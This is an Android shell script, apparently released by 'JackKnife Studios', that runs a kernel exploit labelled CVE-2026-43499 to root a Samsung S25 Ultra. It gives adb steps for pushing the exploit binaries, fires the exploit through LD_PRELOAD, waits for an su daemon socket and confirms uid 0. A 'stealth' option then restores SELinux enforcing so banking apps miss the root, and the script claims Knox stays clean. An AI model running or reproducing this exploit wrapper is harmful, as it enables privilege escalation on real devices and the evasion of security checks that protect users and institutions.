#!/system/bin/sh
# ========================================================================
# JackKnife Root — One-Touch Samsung S25 Ultra Root
# CVE-2026-43499 (GhostLock v6) with Samsung 200GB KASLR Bypass
#
# Usage from computer:
#   adb push jackknife-root.sh /data/local/tmp/
#   adb push cve-2026-43499 /data/local/tmp/
#   adb push cve-2026-43499-root /data/local/tmp/
#   adb shell chmod 755 /data/local/tmp/cve-2026-43499*
#   adb shell sh /data/local/tmp/jackknife-root.sh
#
# Options:
#   --stealth    Restore SELinux Enforcing after root (banking apps)
#   --status     Just check current root status
#
# Root is VOLATILE — lost on reboot. Knox warranty_bit stays CLEAN.
# Re-run this script after each reboot.
#
# JackKnife Studios, July 2026
# ========================================================================

EXPLOIT="/data/local/tmp/cve-2026-43499"
ROOT_HELPER="/data/local/tmp/cve-2026-43499-root"
SOCK="/data/local/tmp/temp_su.sock"

G='\033[0;32m'
R='\033[0;31m'
Y='\033[1;33m'
C='\033[0;36m'
N='\033[0m'

echo ""
echo -e "${G}========================================"
echo "  JACKKNIFE ROOT — GHOSTLOCK v6"
echo "  Samsung S25 Ultra | SM-S938W"
echo "  CVE-2026-43499 | Knox-Safe"
echo -e "========================================${N}"
echo ""

# ------- Status check -------
if [ "$1" = "--status" ]; then
    ID=$($ROOT_HELPER -c id 2>/dev/null)
    if echo "$ID" | grep -q "uid=0"; then
        echo -e "${G}[+]${N} ROOT ACTIVE: $ID"
        echo -e "${C}[*]${N} SELinux: $(getenforce 2>/dev/null)"
    else
        echo -e "${Y}[!]${N} Not rooted (root is volatile — re-run to root)"
    fi
    exit 0
fi

# ------- Check binaries -------
if [ ! -x "$EXPLOIT" ] || [ ! -x "$ROOT_HELPER" ]; then
    echo -e "${R}[-]${N} Exploit binaries not found in /data/local/tmp/"
    echo -e "${C}[*]${N} Push them first:"
    echo "  adb push cve-2026-43499 /data/local/tmp/"
    echo "  adb push cve-2026-43499-root /data/local/tmp/"
    echo "  adb shell chmod 755 /data/local/tmp/cve-2026-43499*"
    exit 1
fi

# ------- Check if already rooted -------
ID=$($ROOT_HELPER -c id 2>/dev/null)
if echo "$ID" | grep -q "uid=0"; then
    echo -e "${G}[+]${N} Already rooted: $ID"
    if [ "$1" = "--stealth" ]; then
        echo -e "${C}[*]${N} Enabling stealth mode..."
        $ROOT_HELPER -c "setenforce 1" 2>/dev/null
        echo -e "${G}[+]${N} SELinux: $(getenforce 2>/dev/null)"
        echo -e "${Y}[!]${N} Stealth active — root helper disabled until next run"
        echo -e "${G}[+]${N} Banking apps should work now!"
    fi
    exit 0
fi

# ------- Phase 1: Fire exploit -------
# The exploit binary handles KASLR collection internally via tracefs.
# ADB shell has readtracefs group (3012) so it can access trace_pipe_raw.
# No external KASLR collection needed — the exploit does everything.

echo -e "${C}[*]${N} Phase 1: Firing GhostLock exploit..."
echo -e "${C}[*]${N} (Exploit will collect KASLR slide from tracefs internally)"
echo ""

# Fire exploit — LD_PRELOAD into /system/bin/true
# No SLIDE_P0_OFFSET = exploit auto-detects via tracefs
LD_PRELOAD="$EXPLOIT" /system/bin/true 2>&1

echo ""

# ------- Phase 2: Wait for su_daemon -------
echo -e "${C}[*]${N} Phase 2: Waiting for su_daemon..."
READY=0
for i in $(seq 1 50); do
    if [ -S "$SOCK" ]; then
        READY=1
        break
    fi
    sleep 0.1
done

if [ "$READY" = "0" ]; then
    echo -e "${R}[-]${N} su_daemon socket not found after 5 seconds"
    echo -e "${Y}[!]${N} The exploit may need a retry — run again"
    exit 1
fi

# ------- Phase 3: Verify root -------
echo -e "${C}[*]${N} Phase 3: Verifying root..."

ID=$($ROOT_HELPER -c id 2>/dev/null)
if echo "$ID" | grep -q "uid=0"; then
    ENFORCE=$(getenforce 2>/dev/null)

    echo ""
    echo -e "${G}========================================"
    echo "  ROOT ACHIEVED!"
    echo "  $ID"
    echo "  SELinux: $ENFORCE"
    echo "  Knox warranty_bit: CLEAN"
    echo -e "========================================${N}"
    echo ""

    if [ "$1" = "--stealth" ]; then
        echo -e "${C}[*]${N} Enabling stealth mode..."
        $ROOT_HELPER -c "setenforce 1" 2>/dev/null
        echo -e "${G}[+]${N} SELinux: $(getenforce 2>/dev/null)"
        echo -e "${Y}[!]${N} Root helper disabled in stealth mode"
        echo -e "${C}[*]${N} To re-enable root: sh $0"
        echo -e "${G}[+]${N} Banking apps should work now!"
    else
        echo -e "${G}[+]${N} Root commands: $ROOT_HELPER -c '<command>'"
        echo -e "${C}[*]${N} Interactive shell: $ROOT_HELPER"
        echo -e "${C}[*]${N} Stealth mode: sh $0 --stealth"
    fi
else
    echo -e "${R}[-]${N} Root verification failed"
    echo -e "${C}[*]${N} Try again — close heavy apps for idle CPU time"
    exit 1
fi
